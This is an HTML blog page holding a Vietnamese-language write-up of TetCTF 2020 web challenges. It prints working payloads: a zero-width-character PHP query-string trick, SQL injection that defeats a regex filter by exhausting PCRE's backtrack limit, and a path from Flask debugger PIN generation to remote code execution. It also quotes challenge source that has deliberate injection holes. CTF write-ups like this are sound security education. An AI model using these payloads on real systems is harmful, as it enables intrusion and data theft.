<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>TetCTF 2020 Web writeup | blog.undo.pw</title><meta name=keywords content="ctf,web"><meta name=description content="Writeup for all the Web challenges in TetCTF 2020"><meta name=author content="son"><link rel=canonical href=https://blog.undo.pw/posts/tetctf-2020-web-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://blog.undo.pw/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.undo.pw/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.undo.pw/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.undo.pw/apple-touch-icon.png><link rel=mask-icon href=https://blog.undo.pw/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="TetCTF 2020 Web writeup"><meta property="og:description" content="Writeup for all the Web challenges in TetCTF 2020"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.undo.pw/posts/tetctf-2020-web-writeup/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-01-08T00:00:00+00:00"><meta property="article:modified_time" content="2020-01-08T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="TetCTF 2020 Web writeup"><meta name=twitter:description content="Writeup for all the Web challenges in TetCTF 2020"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://blog.undo.pw/posts/"},{"@type":"ListItem","position":2,"name":"TetCTF 2020 Web writeup","item":"https://blog.undo.pw/posts/tetctf-2020-web-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TetCTF 2020 Web writeup","name":"TetCTF 2020 Web writeup","description":"Writeup for all the Web challenges in TetCTF 2020","keywords":["ctf","web"],"articleBody":"WYSINWYG What you see is not what you get... Do you see the flag? then you don't get the flag. TÃ¡c giáº£ cho ta má»™t Ä‘oáº¡n code PHP ngáº¯n:\n\u003c?php ini_set(\"display_errors\", 0); include('secret.php'); show_source(__FILE__); if (isset($_GET['a']) \u0026\u0026 isset($_GET['b'])) { $a = $_GET['a']; $b = $_GET['b']; if (!empty($a) \u0026\u0026 !empty($b)) { if ($a === $b) { if (isset($_GET['aâ¡']) \u0026\u0026 isset($_GET['bâ¦'])) { $a = $_GET['aâ¡']; $b = $_GET['bâ¦']; if ($a !== $b) { die($flag); } } } } } BÃ i nÃ y tÃ¡c giáº£ chÃ¨n 2 kÃ­ tá»± zero-width space vÃ o sau a vÃ  b á»Ÿ dÃ²ng 11, 12 vÃ  13.\nPoC:\n/?a=1\u0026b=1\u0026a%E2%81%A1=1\u0026b%E2%81%A6=0 Secure System I created a security checker, can you help audit the source? Source: https://drive.google.com/file/d/1vOPmS30ZrW5-Uoz-AKBef3T6no2qpvt_/view Source code chá»‰ cÃ³ 1 file index.php nhÆ° sau:\n\u003c?php require_once('dbconnect.php'); $flag = mysqli_query($conn, \"SELECT * FROM xxxxxxxxxxxxxxxxxxx\")-\u003efetch_assoc()['yyyyyyyyyyyyyyyyyyyy']; //Sorry It's our secret, can't share ?\u003e \u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e \u003ccenter\u003e Security Check!!! Please enter your ID to prove who are you !!!: \u003cform action=\"index.php\" method=\"POST\"\u003e \u003cinput name=\"id\" value=\"\"/\u003e\u003cbr\u003e \u003cinput type=\"submit\" value=\"Submit\"/\u003e \u003c/form\u003e \u003c/center\u003e \u003c?php if (isset($_POST['id']) \u0026\u0026 !empty($_POST['id'])) { if (preg_match('/and|or|in|if|case|sleep|benchmark/is', $_POST['id'])) { die('Tet nhat ai lai hack nhau :(, very dangerous key word'); } elseif (preg_match('/order.+?by|union.+?select/is', $_POST['id'])) { die('Tet nhat ai lai hack nhau :(, very dangerous statement'); } else { $user = mysqli_query($conn, \"SELECT * FROM users WHERE id=\" . $_POST['id'])-\u003efetch_assoc()['username']; if ($user !== 'admin') { echo 'Hello ' . htmlentities($user); if ($user === 'admin') { echo 'This can\\'t be =]] Just put here for fun lul'; die($flag); } } } } ?\u003e DÃ²ng 4 chÃºng ta cÃ³ 1 hint cá»§a tÃ¡c giáº£ lÃ  pháº£i sá»­ dá»¥ng SQL Injection vÃ  leak Ä‘Æ°á»£c flag á»Ÿ 1 column Y vÃ  table X nÃ o Ä‘Ã³ mÃ  chÃºng ta chÆ°a biáº¿t trong database.\nChÃºng ta bá»‹ cháº·n sá»­ dá»¥ng cÃ¢u lá»‡nh order by vÃ  union select, Ä‘áº·c biá»‡t lÆ°u Ã½ lÃ  cá»¥m in cÅ©ng bá»‹ cháº·n, Ä‘iá»u nÃ y dáº«n Ä‘áº¿n sáº½ cÃ³ Ä‘Ã´i chÃºt khÃ³ khÄƒn Ä‘á»ƒ ta láº¥y Ä‘Æ°á»£c table name vÃ  column name tá»« information_schema cÅ©ng nhÆ° cÃ¡c database cÃ³ prefix innodb.\nNhÆ°ng chÃºng ta cÃ³ thá»ƒ bypass preg_match á»Ÿ dÃ²ng 21 báº±ng cÃ¡ch lÃ m cho PCRE (Engine xá»­ lÃ­ Regular Expression trong PHP) xá»­ lÃ­ input cá»§a ta, lÃ m cho vÆ°á»£t quÃ¡ backtrack limit máº·c Ä‘á»‹nh cá»§a PHP. Báº±ng cÃ¡ch nÃ y, chÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng order by hay union select dá»… dÃ ng.\nGet table name MÃ¬nh quyáº¿t Ä‘á»‹nh sá»­ dá»¥ng view x$ps_schema_table_statistics_io cÃ³ trong database sys vÃ¬ theo nhÆ° MySQL documentation mÃ´ táº£:\nThese views summarize table statistics. By default, rows are sorted by descending total wait time (tables with most contention first). vÃ  trong view nÃ y cÅ©ng cÃ³ chá»©a 2 columns lÃ  table_schema vÃ  table_name.\nres = requests.post('http://45.77.240.178:8002/index.php', data={ 'id': '5 union/*' + 'a'*1000000 + '*/select 1,group_concat(table_name),3 from sys.x$ps_schema_table_statistics_io where table_schema=database()' }) Table name: Th1z_Fack1n_Fl4444g_Tabl3\nGet flag without knowing column name CÃ¡ch nÃ y Ä‘Ã£ Ä‘Æ°á»£c anh @tsug0d mÃ´ táº£ cá»±c kÃ¬ chi tiáº¿t vÃ  dá»… hiá»ƒu trong blog cá»§a anh nÃªn mÃ¬nh khÃ´ng dÃ i dÃ²ng ná»¯a. Get flag thÃ´i!\nres = requests.post('http://45.77.240.178:8002/index.php', data={ 'id': '5 union/*' + 'a'*1000000 + '*/select 1,b,3 from (select 1 a, 2 b union select * from Th1z_Fack1n_Fl4444g_Tabl3 limit 1,1)x' }) Another way from the author ğŸ‰ğŸ‰ğŸ‰\nThe Prophet Wohoo, wanna hear some oracle? BÃ i nÃ y chá»‰ cÃ³ 1 chá»©c nÄƒng cÆ¡ báº£n lÃ  Ä‘á»c cÃ¡c file text cÃ³ tÃªn tá»« 1 - 5. Khi ta thá»­ file 6.txt, trang xuáº¥t hiá»‡n giao diá»‡n thÃ´ng bÃ¡o lá»—i cá»§a Flask, chá»©ng tá» debug mode Ä‘ang Ä‘Æ°á»£c enabled. Trong giao diá»‡n bÃ¡o lá»—i, chÃºng ta cÃ³ thá»ƒ Ä‘á»c 1 pháº§n source code Ä‘Ã£ bá»‹ disclosed:\nTa dá»… dÃ ng tháº¥y Ä‘Æ°á»£c lá»—i Local File Inclusion (LFI) trong Ä‘oáº¡n code xá»­ lÃ­ Ä‘á»c file nÃ y. Biáº¿n filename Ä‘Æ°á»£c truyá»n tháº³ng Ä‘áº¿n hÃ m open() vÃ  ná»™i dung Ä‘Æ°á»£c Ä‘Æ°a ra ngoÃ i thÃ´ng qua hÃ m render_template().\nNgay lÃºc nÃ y, mÃ¬nh nháº­n ra ráº±ng viá»‡c chÃºng ta cÃ³ lá»—i LFI sáº½ dáº«n Ä‘áº¿n viá»‡c cÃ³ thá»ƒ generate Ä‘Æ°á»£c debugger PIN code, sau Ä‘Ã³ sá»­ dá»¥ng chá»©c nÄƒng Interactive shell Ä‘Æ°á»£c tÃ­ch há»£p trong giao diá»‡n lá»—i cá»§a Flask Ä‘á»ƒ cÃ³ thá»ƒ leverage lÃªn RCE.\nSau khi lÃ m theo bÃ i hÆ°á»›ng dáº«n generate PIN code vÃ  Ä‘Ã£ cÃ³ Ä‘Æ°á»£c PIN, giá» chá»‰ viá»‡c submit PIN vÃ  RCE thÃ´i, nhÆ°ng Ä‘á»i khÃ´ng nhÆ° mÆ¡ vÃ  cuá»™c sá»‘ng khÃ´ng dá»… thá»Ÿâ€¦\nOk, tá»± trong Ä‘áº§u nghÄ© cháº¯c Ä‘Ã¢y cÅ©ng lÃ  Ã½ cá»§a tÃ¡c giáº£ thÃ´i, cháº¯c cÃ³ chá»— nÃ o Ä‘Ã¢u Ä‘Ã³ trong pháº§n xá»­ lÃ­ nháº­p PIN nÃ y cÃ³ thá»ƒ vÆ°á»£t Ä‘Æ°á»£c, let check it out. ğŸ§\n# https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/__init__.py # ... def hash_pin(pin): if isinstance(pin, text_type): pin = pin.encode(\"utf-8\", \"replace\") return hashlib.md5(pin + b\"shittysalt\").hexdigest()[:12] # ... class DebuggedApplication(object): # ... def check_pin_trust(self, environ): \"\"\"Checks if the request passed the pin test. This returns `True` if the request is trusted on a pin/cookie basis and returns `False` if not. Additionally if the cookie's stored pin hash is wrong it will return `None` so that appropriate action can be taken. \"\"\" if self.pin is None: return True val = parse_cookie(environ).get(self.pin_cookie_name) if not val or \"|\" not in val: return False ts, pin_hash = val.split(\"|\", 1) if not ts.isdigit(): return False if pin_hash != hash_pin(self.pin): return None return (time.time() - PIN_TIME) \u003c int(ts) def pin_auth(self, request): \"\"\"Authenticates with the pin.\"\"\" exhausted = False auth = False trust = self.check_pin_trust(request.environ) # If the trust return value is `None` it means that the cookie is # set but the stored pin hash value is bad. This means that the # pin was changed. In this case we count a bad auth and unset the # cookie. This way it becomes harder to guess the cookie name # instead of the pin as we still count up failures. bad_cookie = False if trust is None: self._fail_pin_auth() bad_cookie = True # If we're trusted, we're authenticated. elif trust: auth = True # If we failed too many times, then we're locked out. elif self._failed_pin_auth \u003e 10: exhausted = True # Otherwise go through pin based authentication else: entered_pin = request.args.get(\"pin\") if entered_pin.strip().replace(\"-\", \"\") == self.pin.replace(\"-\", \"\"): self._failed_pin_auth = 0 auth = True else: self._fail_pin_auth() rv = Response( json.dumps({\"auth\": auth, \"exhausted\": exhausted}), mimetype=\"application/json\", ) if auth: rv.set_cookie( self.pin_cookie_name, \"%s|%s\" % (int(time.time()), hash_pin(self.pin)), httponly=True, ) elif bad_cookie: rv.delete_cookie(self.pin_cookie_name) return rv # ... Hai dÃ²ng Ä‘Æ°á»£c highlight lÃ  cÃ¢u lá»‡nh if kiá»ƒm tra Ä‘iá»u kiá»‡n náº¿u nháº­p sai quÃ¡ 10 láº§n thÃ¬ exhausted = True, tá»« Ä‘Ã³ ta suy ra Ä‘Ã£ cÃ³ ngÆ°á»i submit sai PIN khoáº£ng 7 - 8 láº§n trÆ°á»›c Ä‘Ã³, Ä‘á»ƒ Ä‘áº¿n lÆ°á»£t mÃ¬nh thÃ¬ sau khi thá»­ 2 - 3 mÃ£ PIN thÃ¬ nÃ³ lÃªn 10. ğŸ˜¤\nOk, quay láº¡i nÃ o. VÃ¬ cÃ¢u Ä‘iá»u kiá»‡n check nháº­p sai náº±m trong nhÃ¡nh elif nÃªn chá»‰ cáº§n 2 cÃ¢u Ä‘iá»u kiá»‡n á»Ÿ trÃªn Ä‘Ãºng thÃ¬ sáº½ khÃ´ng thá»±c thi. Biáº¿n trust Ä‘Æ°á»£c khá»Ÿi táº¡o vá»›i value lÃ  return value cá»§a hÃ m check_pin_trust(), hÃ m nÃ y thá»±c hiá»‡n get vÃ  parse cookie, kiá»ƒm tra PIN hash trong cookie cÃ³ Ä‘Ãºng vá»›i PIN hash trÃªn server hay khÃ´ng, PIN expired time cÃ³ háº¿t háº¡n hay chÆ°a.\nVÃ¬ chÃºng ta cÃ³ thá»ƒ control Ä‘Æ°á»£c cookie nÃªn ta cÃ³ thá»ƒ tÃ¹y biáº¿n Ä‘Æ°á»£c cookie Ä‘á»ƒ vÆ°á»£t qua Ä‘Æ°á»£c viá»‡c check exhausted. MÃ¬nh Ä‘Ã£ cÃ³ quyá»n cháº¡y Python code trÃªn interactive shell rá»“i, tÃ¬m vÃ  Ä‘á»c flag ráº¥t dá»… dÃ ng.\nAuthor nÃ³i gÃ¬? Ok, giáº£i xong inbox author thÃ¬ áº£nh báº£o chá»‰ cáº§n generate PIN code lÃ  xong rá»“i RCE láº¥y flag thÃ´i, táº¡i lÃºc Ä‘Ã³ setup cÃ³ váº¥n Ä‘á» nÃªn má»›i bá»‹ exhausted. ğŸ˜¤\nMeePwnTube2050 Source: https://drive.google.com/file/d/12MZJiMUCmLJ84-NypWByEzezkz4fx9RA/view BÃ i nÃ y mÃ¬nh stuck Ä‘áº¿n ngÃ y hÃ´m sau má»›i nghÄ© Ä‘Æ°á»£c hÆ°á»›ng ğŸ˜…\nVÃ¬ mÃ¬nh ngÃ¢m Ä‘i ngÃ¢m láº¡i source code nhiá»u láº§n Ä‘á»ƒ cháº¯c cháº¯n ráº±ng khÃ´ng cÃ³ 1 lá»—i nÃ o cÃ³ thá»ƒ xáº£y ra, vÃ  Ä‘áº¿n khi mÃ¬nh chá»£t Ä‘á»ƒ Ã½ 1 chi tiáº¿t nhá» trong search.php:\n\u003c?php include \"dbconnect.php\"; $_IP = $_SERVER['REMOTE_ADDR']; if (isset($_GET['search'])) { if ($_IP === \"45.76.148.212\"){ //local only homie $Name = $_GET['search']; $_search = mysqli_real_escape_string($admin_conn,$Name); $Execquery = mysqli_query($admin_conn, \"SELECT id,Name FROM search WHERE Name LIKE '%$_search%' LIMIT 8\"); while ($Result = mysqli_fetch_array($Execquery)) { echo \"\"; echo \"\".$Result['Name'].\"\n\"; echo \"","wordCount":"2042","inLanguage":"en","datePublished":"2020-01-08T00:00:00Z","dateModified":"2020-01-08T00:00:00Z","author":{"@type":"Person","name":"son"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.undo.pw/posts/tetctf-2020-web-writeup/"},"publisher":{"@type":"Organization","name":"blog.undo.pw","logo":{"@type":"ImageObject","url":"https://blog.undo.pw/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.undo.pw/ accesskey=h title="blog.undo.pw (Alt + H)">blog.undo.pw</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://blog.undo.pw/archives title=archives><span>archives</span></a></li><li><a href=https://blog.undo.pw/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=https://blog.undo.pw/tags/ title=tags><span>tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://blog.undo.pw/>Home</a>&nbsp;Â»&nbsp;<a href=https://blog.undo.pw/posts/>Posts</a></div><h1 class=post-title>TetCTF 2020 Web writeup</h1><div class=post-meta><span title='2020-01-08 00:00:00 +0000 UTC'>January 8, 2020</span>&nbsp;Â·&nbsp;10 min&nbsp;Â·&nbsp;son&nbsp;|&nbsp;<a href=https://github.com/qnhn/qnhn.github.io/tree/main/content/posts/tetctf-2020-web-writeup.md rel="noopener noreferrer" target=_blank>suggest changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#wysinwyg>WYSINWYG</a></li><li><a href=#secure-system>Secure System</a><ul><li><a href=#get-table-name>Get table name</a></li><li><a href=#get-flag-without-knowing-column-name>Get flag without knowing column name</a></li><li><a href=#another-way-from-the-author>Another way from the author</a></li></ul></li><li><a href=#the-prophet>The Prophet</a><ul><li><a href=#author-nÃ³i-gÃ¬>Author nÃ³i gÃ¬?</a></li></ul></li><li><a href=#meepwntube2050>MeePwnTube2050</a></li><li><a href=#hellovietnamv2>HelloVietNamv2</a><ul><li><a href=#wheres-the-real-bug-in-the-source-code>Where&rsquo;s the real bug in the source code?</a></li><li><a href=#exploit>Exploit</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=wysinwyg>WYSINWYG<a hidden class=anchor aria-hidden=true href=#wysinwyg>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>What you see is not what you get... Do you see the flag? then you don&#39;t get the flag.
</span></span></code></pre></div><p>TÃ¡c giáº£ cho ta má»™t Ä‘oáº¡n code PHP ngáº¯n:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>ini_set</span>(<span style=color:#e6db74>&#34;display_errors&#34;</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span>(<span style=color:#e6db74>&#39;secret.php&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>show_source</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;a&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;b&#39;</span>])) {
</span></span><span style=display:flex><span>    $a <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;a&#39;</span>];
</span></span><span style=display:flex><span>    $b <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;b&#39;</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($a) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($b)) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($a <span style=color:#f92672>===</span> $b) {
</span></span><span style=display:flex;background-color:#3c3d38><span>            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;aâ¡&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;bâ¦&#39;</span>])) {
</span></span><span style=display:flex;background-color:#3c3d38><span>                $a <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;aâ¡&#39;</span>];
</span></span><span style=display:flex;background-color:#3c3d38><span>                $b <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;bâ¦&#39;</span>];
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> ($a <span style=color:#f92672>!==</span> $b) {
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>die</span>($flag);
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>BÃ i nÃ y tÃ¡c giáº£ chÃ¨n 2 kÃ­ tá»± <a href=https://en.wikipedia.org/wiki/Zero-width_space>zero-width space</a> vÃ o sau <code>a</code> vÃ  <code>b</code> á»Ÿ dÃ²ng 11, 12 vÃ  13.</p><p>PoC:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>/?a=1&amp;b=1&amp;a%E2%81%A1=1&amp;b%E2%81%A6=0
</span></span></code></pre></div><h2 id=secure-system>Secure System<a hidden class=anchor aria-hidden=true href=#secure-system>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>I created a security checker, can you help audit the source?
</span></span><span style=display:flex><span>Source: https://drive.google.com/file/d/1vOPmS30ZrW5-Uoz-AKBef3T6no2qpvt_/view
</span></span></code></pre></div><p>Source code chá»‰ cÃ³ 1 file index.php nhÆ° sau:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-phtml data-lang=phtml><span style=display:flex><span><span style=color:#75715e>&lt;?php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>require_once</span>(<span style=color:#e6db74>&#39;dbconnect.php&#39;</span>);
</span></span><span style=display:flex><span>$flag <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysqli_query</span>($conn, <span style=color:#e6db74>&#34;SELECT * FROM xxxxxxxxxxxxxxxxxxx&#34;</span>)<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fetch_assoc</span>()[<span style=color:#e6db74>&#39;yyyyyyyyyyyyyyyyyyyy&#39;</span>]; <span style=color:#75715e>//Sorry It&#39;s our secret, can&#39;t share
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>?&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>br</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>center</span>&gt;
</span></span><span style=display:flex><span>    Security Check!!! Please enter your ID to prove who are you !!!:
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;index.php&#34;</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;POST&#34;</span>&gt;
</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;id&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>/&gt;&lt;<span style=color:#f92672>br</span>&gt;
</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Submit&#34;</span>/&gt;
</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>form</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>center</span>&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;?php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;id&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($_POST[<span style=color:#e6db74>&#39;id&#39;</span>])) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/and|or|in|if|case|sleep|benchmark/is&#39;</span>, $_POST[<span style=color:#e6db74>&#39;id&#39;</span>])) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;Tet nhat ai lai hack nhau :(, very dangerous key word&#39;</span>);
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>elseif</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/order.+?by|union.+?select/is&#39;</span>, $_POST[<span style=color:#e6db74>&#39;id&#39;</span>])) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;Tet nhat ai lai hack nhau :(, very dangerous statement&#39;</span>);
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        $user <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysqli_query</span>($conn, <span style=color:#e6db74>&#34;SELECT * FROM users WHERE id=&#34;</span> <span style=color:#f92672>.</span> $_POST[<span style=color:#e6db74>&#39;id&#39;</span>])<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fetch_assoc</span>()[<span style=color:#e6db74>&#39;username&#39;</span>];
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($user <span style=color:#f92672>!==</span> <span style=color:#e6db74>&#39;admin&#39;</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;Hello &#39;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>htmlentities</span>($user);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> ($user <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;admin&#39;</span>) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;This can\&#39;t be =]] Just put here for fun lul&#39;</span>;
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>die</span>($flag);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span>
</span></span></code></pre></div><p>DÃ²ng 4 chÃºng ta cÃ³ 1 hint cá»§a tÃ¡c giáº£ lÃ  pháº£i sá»­ dá»¥ng SQL Injection vÃ  leak Ä‘Æ°á»£c flag á»Ÿ 1 column Y vÃ  table X nÃ o Ä‘Ã³ mÃ  chÃºng ta chÆ°a biáº¿t trong database.</p><p>ChÃºng ta bá»‹ cháº·n sá»­ dá»¥ng cÃ¢u lá»‡nh <code>order by</code> vÃ  <code>union select</code>, Ä‘áº·c biá»‡t lÆ°u Ã½ lÃ  cá»¥m <code>in</code> cÅ©ng bá»‹ cháº·n, Ä‘iá»u nÃ y dáº«n Ä‘áº¿n sáº½ cÃ³ Ä‘Ã´i chÃºt khÃ³ khÄƒn Ä‘á»ƒ ta láº¥y Ä‘Æ°á»£c table name vÃ  column name tá»« <code>information_schema</code> cÅ©ng nhÆ° cÃ¡c database cÃ³ prefix <code>innodb</code>.</p><p>NhÆ°ng chÃºng ta cÃ³ thá»ƒ bypass <code>preg_match</code> á»Ÿ dÃ²ng 21 báº±ng cÃ¡ch lÃ m cho PCRE (Engine xá»­ lÃ­ Regular Expression trong PHP) xá»­ lÃ­ input cá»§a ta, lÃ m cho vÆ°á»£t quÃ¡ backtrack limit máº·c Ä‘á»‹nh <a href=https://www.php.net/manual/en/pcre.configuration.php>cá»§a</a> <a href=https://stackoverflow.com/a/40426462>PHP</a>. Báº±ng cÃ¡ch nÃ y, chÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng <code>order by</code> hay <code>union select</code> dá»… dÃ ng.</p><h3 id=get-table-name>Get table name<a hidden class=anchor aria-hidden=true href=#get-table-name>#</a></h3><p>MÃ¬nh quyáº¿t Ä‘á»‹nh sá»­ dá»¥ng view <code>x$ps_schema_table_statistics_io</code> cÃ³ trong database <code>sys</code> vÃ¬ theo nhÆ° <a href=https://dev.mysql.com/doc/refman/5.7/en/sys-schema-table-statistics.html>MySQL documentation</a> mÃ´ táº£:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>These views summarize table statistics. By default, rows are sorted by descending total wait time (tables with most contention first).
